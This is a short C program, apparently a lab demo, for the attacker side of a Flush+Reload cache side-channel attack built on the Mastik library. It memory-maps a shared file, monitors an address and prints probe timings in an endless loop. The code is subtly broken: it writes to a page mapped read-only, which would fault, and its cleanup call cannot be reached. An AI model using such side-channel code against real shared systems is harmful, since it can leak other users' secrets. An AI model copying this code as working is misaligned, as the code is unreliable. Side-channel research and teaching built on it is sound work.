#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include "mastik/fr.h"

int main() {

    fr_t fr;
    int fd;
    char *addr;
    int threshold;
    uint16_t results[1];

    fd = open("shared.bin", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    addr = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) { perror("mmap"); return 1; }

    fr = fr_prepare();

    addr[0] = 1; 
    fr_monitor(fr, addr);

    threshold = fr_probethreshold();
    printf("[Attacker] Threshold = %d cycles\n", threshold);

    while (1) {
    fr_probe(fr, results);
    printf("Time = %u cycles\n", results[0]);
    usleep(5000);
}

    fr_release(fr);
    return 0;
}
